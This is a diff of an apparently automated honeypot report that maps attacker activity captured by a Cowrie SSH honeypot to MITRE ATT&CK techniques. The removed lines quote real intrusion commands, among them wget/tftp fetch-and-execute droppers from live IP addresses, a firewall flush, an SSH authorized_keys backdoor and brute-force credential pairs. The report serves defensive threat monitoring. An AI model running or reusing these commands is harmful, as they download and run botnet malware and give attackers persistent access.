@@ -1,305 +1,54 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-16 23:05:12",
+  "generated": "2026-08-17 00:04:11",
   "totals": {
-    "commands": 5006,
-    "login_failed": 8790,
-    "login_success": 1257,
-    "sessions": 6439
+    "commands": 166,
+    "login_failed": 92,
+    "login_success": 56,
+    "sessions": 70
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 8790,
+      "count": 92,
       "examples": [
-        "usr1cv8 / usr1cv8",
-        "serv / serv",
-        "cephadm / cephadm",
-        "admin / 12345678",
-        "admin / Aa123456"
+        "user / user",
+        "root / juantech",
+        "root / 7ujMko0admin",
+        "root / anko",
+        "root / 54321"
       ],
-      "first": "2026-08-16T00:00:42.329332Z",
-      "last": "2026-08-16T23:05:12.157721Z",
-      "unique_ips": 146
+      "first": "2026-08-17T00:00:02.095344Z",
+      "last": "2026-08-17T00:04:10.807966Z",
+      "unique_ips": 3
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1257,
+      "count": 56,
       "examples": [
-        "admin / admin",
-        "enable\\x00 / linuxshell\\x00",
-        "admin / admin123",
-        "enable / system",
-        "installer / installer"
+        "enable\\x00 / linuxshell\\x00"
       ],
-      "first": "2026-08-16T00:06:11.647402Z",
-      "last": "2026-08-16T23:05:12.572046Z",
-      "unique_ips": 120
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 513,
-      "examples": [
-        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
-        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
-        ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
-        ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/",
-        ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
-      ],
-      "first": "2026-08-16T00:06:13.111253Z",
-      "last": "2026-08-16T23:02:06.353448Z",
-      "unique_ips": 41
-    },
-    {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 307,
-      "examples": [
-        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t",
-        "http://2.26.136.128/twget.sh",
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "http://185.93.89.72/wget",
-        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t"
-      ],
-      "first": "2026-08-16T00:06:13.111253Z",
-      "last": "2026-08-16T23:02:06.353448Z",
-      "unique_ips": 44
-    },
-    {
-      "id": "T1033",
-      "name": "System Owner/User Discovery",
-      "tactic": "Discovery",
-      "count": 25,
-      "examples": [
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "id"
-      ],
-      "first": "2026-08-16T01:30:05.936984Z",
-      "last": "2026-08-16T23:01:30.288618Z",
-      "unique_ips": 25
-    },
-    {
-      "id": "T1082",
-      "name": "System Information Discovery",
-      "tactic": "Discovery",
-      "count": 21,
-      "examples": [
-        "uname -a",
-        "/bin/./uname -s -v -n -r -m",
-        "uname -s -v -n -r -m",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "uname -a && echo '---SEP---' && nproc && echo '---SEP---' && nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/nu"
-      ],
-      "first": "2026-08-16T00:42:14.174728Z",
-      "last": "2026-08-16T22:55:06.598800Z",
-      "unique_ips": 18
-    },
-    {
-      "id": "T1083",
-      "name": "File and Directory Discovery",
-      "tactic": "Discovery",
-      "count": 12,
-      "examples": [
-        "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    i",
-        "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O htt",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-08-16T04:59:41.873500Z",
-      "last": "2026-08-16T20:24:39.205251Z",
-      "unique_ips": 3
-    },
-    {
-      "id": "T1489",
-      "name": "Service Stop",
-      "tactic": "Impact",
-      "count": 11,
-      "examples": [
-        "#!/bin/sh\n\nfor proc_dir in /proc/*; do\n    pid=${proc_dir##*/}\n\n    result=$(ls -l \"/proc/$pid/exe\" 2> /dev/null)\n\n    i",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-08-16T04:59:41.873500Z",
-      "last": "2026-08-16T20:24:39.205251Z",
-      "unique_ips": 2
-    },
-    {
-      "id": "T1059.004",
-      "name": "Command and Scripting Interpreter: Unix Shell",
-      "tactic": "Execution",
-      "count": 4,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
-        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-08-16T04:06:16.505165Z",
-      "last": "2026-08-16T20:24:39.205251Z",
-      "unique_ips": 3
-    },
-    {
-      "id": "T1070.004",
-      "name": "Indicator Removal: File Deletion",
-      "tactic": "Defense Evasion",
-      "count": 3,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O htt",
-        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
-      ],
-      "first": "2026-08-16T04:06:16.505165Z",
-      "last": "2026-08-16T19:07:51.547990Z",
-      "unique_ips": 3
-    },
-    {
-      "id": "T1140",
-      "name": "Deobfuscate/Decode Files or Information",
-      "tactic": "Defense Evasion",
-      "count": 2,
-      "examples": [
-        "/bin/busybox echo bFRP | base64 -d; /bin/busybox echo Nkty | openssl base64 -d; /bin/busybox goOLuDcG",
-        "/bin/busybox echo bFRP | base64 -d; /bin/busybox echo Nkty | openssl base64 -d; /bin/busybox rISkLdx5"
-      ],
-      "first": "2026-08-16T06:24:05.702682Z",
-      "last": "2026-08-16T10:49:08.755756Z",
-      "unique_ips": 2
-    },
-    {
-      "id": "T1037",
-      "name": "Boot or Logon Initialization Scripts",
-      "tactic": "Persistence",
-      "count": 1,
-      "examples": [
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-08-16T20:24:39.205251Z",
-      "last": "2026-08-16T20:24:39.205251Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1087.001",
-      "name": "Account Discovery: Local Account",
-      "tactic": "Discovery",
-      "count": 1,
-      "examples": [
-        "cat /etc/passwd"
-      ],
-      "first": "2026-08-16T07:41:53.576179Z",
-      "last": "2026-08-16T07:41:53.576179Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1098.004",
-      "name": "Account Manipulation: SSH Authorized Keys",
-      "tactic": "Persistence",
-      "count": 1,
-      "examples": [
-        "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ"
-      ],
-      "first": "2026-08-16T20:24:34.871130Z",
-      "last": "2026-08-16T20:24:34.871130Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1562.004",
-      "name": "Impair Defenses: Disable or Modify System Firewall",
-      "tactic": "Defense Evasion",
-      "count": 1,
-      "examples": [
-        "iptables -F"
-      ],
-      "first": "2026-08-16T02:35:33.282184Z",
-      "last": "2026-08-16T02:35:33.282184Z",
+      "first": "2026-08-17T00:00:02.486601Z",
+      "last": "2026-08-17T00:04:11.239583Z",
       "unique_ips": 1
     }
   ],
   "unmapped": [
     [
-      "sh",
-      1159
+      "system",
+      56
     ],
     [
       "shell",
-      1127
+      55
     ],
     [
-      "system",
-      1108
-    ],
-    [
-      "/bin/busybox",
-      437
-    ],
-    [
-      "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      71
-    ],
-    [
-      "enable",
-      59
-    ],
-    [
-      "linuxshell",
-      45
-    ],
-    [
-      "shel",
-      33
-    ],
-    [
-      "ping ;sh",
-      30
-    ],
-    [
-      "cd /proc && cat self/cmdline",
-      29
-    ],
-    [
-      "enablelinuxshell",
-      28
-    ],
-    [
-      "busybox",
-      21
-    ],
-    [
-      "zalee",
-      18
-    ],
-    [
-      "za",
-      18
-    ],
-    [
-      "&k`g&k|zpkfq)ES[M",
-      18
-    ],
-    [
-      "/bin/busybox BOTNET",
-      11
-    ],
-    [
-      "sh .k",
-      10
-    ],
-    [
-      "ping; sh",
-      9
-    ],
-    [
-      "/bin/busybox STC",
-      9
-    ],
-    [
-      "/bin/busybox hostname TOASTER",
-      9
+      "sh",
+      55
     ]
   ]
 }
